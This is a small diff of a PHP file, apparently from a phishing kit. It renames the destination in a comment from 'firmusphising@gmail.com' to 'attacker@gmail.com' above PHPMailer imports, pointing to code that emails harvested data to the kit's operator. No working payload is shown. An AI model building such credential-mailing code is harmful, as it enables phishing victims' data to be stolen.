@@ -12,7 +12,7 @@ fclose($myfile);
 
 
 
-// Send email to firmusphising@gmail.com
+// Send email to attacker@gmail.com
 
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\SMTP;
